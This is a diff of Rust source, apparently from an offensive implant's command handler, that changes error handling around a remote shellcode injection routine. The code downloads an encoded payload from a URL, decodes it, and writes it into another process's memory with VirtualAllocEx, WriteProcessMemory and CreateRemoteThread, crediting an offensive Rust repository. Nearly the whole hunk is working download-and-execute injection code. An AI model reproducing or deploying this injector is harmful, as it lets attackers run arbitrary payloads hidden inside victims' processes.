@@ -76,66 +76,69 @@ pub async fn handle(base64_string: &String, logger: &Logger) -> Result<String, B
 
         logger.debug(format!("Injecting into PID {:?}", pid));
         let client = Client::new();
-        let r = client.get(url).send().await?;
-        if r.status().is_success() {   
-            logger.info(format!("Got the shellcode")); 
-            // Get the shellcode. Now we have to decode it
-            let mut shellcode_encoded: Vec<u8>;
-            let mut shellcode_string: String;
-            let mut shellcode: Vec<u8>;
-            if let Ok(sc) = r.text().await {
-                shellcode_encoded = Vec::from(sc.trim().as_bytes());
-                logger.info(format!("Got encoded bytes"));
-                for i in 0..b64_iterations {
-                    logger.debug(format!("Decode iteration: {i}"));
-                    match b64_decode(shellcode_encoded) {
-                        Ok(d) => {
-                            shellcode_encoded = d
-                                .into_iter()
-                                .filter(|&b| b != 0x0a)
-                                .collect();
-                        },
-                        Err(e) => { return Ok(e.to_string()); }
-                    };
-                    
+        if let Ok(r) = client.get(url).send().await {
+            if r.status().is_success() {   
+                logger.info(format!("Got the shellcode")); 
+                // Get the shellcode. Now we have to decode it
+                let mut shellcode_encoded: Vec<u8>;
+                let mut shellcode_string: String;
+                let mut shellcode: Vec<u8>;
+                if let Ok(sc) = r.text().await {
+                    shellcode_encoded = Vec::from(sc.trim().as_bytes());
+                    logger.info(format!("Got encoded bytes"));
+                    for i in 0..b64_iterations {
+                        logger.debug(format!("Decode iteration: {i}"));
+                        match b64_decode(shellcode_encoded) {
+                            Ok(d) => {
+                                shellcode_encoded = d
+                                    .into_iter()
+                                    .filter(|&b| b != 0x0a)
+                                    .collect();
+                            },
+                            Err(e) => { return Ok(e.to_string()); }
+                        };
+                        
+                    }
+                    // Convert bytes to our proper string
+                    shellcode_string = String::from_utf8(shellcode_encoded)?;
+                    // At this point, we have the comma-separated "0xNN" form of the shellcode.
+                    // We need to get each one until a proper u8.
+                    shellcode = shellcode_string
+                        .split(",")
+                        .map(|s| s.replace("0x", ""))                    
+                        .map(|s|{ 
+                            match u8::from_str_radix(&s, 16) {
+                                Ok(b) => b,
+                                Err(_) => 0
+                            }
+                        })
+                        .collect();
+    
+                } else {
+                    let err_msg = "Could not decode shellcode";
+                    logger.err(err_msg.to_string());
+                    return Ok(err_msg.to_string());
                 }
-                // Convert bytes to our proper string
-                shellcode_string = String::from_utf8(shellcode_encoded)?;
-                // At this point, we have the comma-separated "0xNN" form of the shellcode.
-                // We need to get each one until a proper u8.
-                shellcode = shellcode_string
-                    .split(",")
-                    .map(|s| s.replace("0x", ""))                    
-                    .map(|s|{ 
-                        match u8::from_str_radix(&s, 16) {
-                            Ok(b) => b,
-                            Err(_) => panic!("Couldn't parse {s}")
-                        }
-                    })
-                    .collect();
-
+    
+    
+                // Big thanks to trickster0
+                // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
+                unsafe {
+                    let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
+                    let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+                    let mut n = 0;
+                    kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
+                    let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
+                    kernel32::CloseHandle(h);
+                }
+                return Ok("Injection completed!".to_string());
             } else {
-                let err_msg = "Could not decode shellcode";
-                logger.err(err_msg.to_string());
-                return Ok(err_msg.to_string());
-            }
+                return Ok("Could not download shellcode".to_string());
+            }   
 
-
-            // Big thanks to trickster0
-            // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
-            unsafe {
-                let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
-                let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
-                let mut n = 0;
-                kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
-                let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
-                kernel32::CloseHandle(h);
-            }
-            return Ok("Injection completed!".to_string());
         } else {
-            return Ok("Could not download shellcode".to_string());
-        }   
-
+            return Ok(format!("Could not download from {url}"));
+        }
     }
     
     #[cfg(not(windows))] {
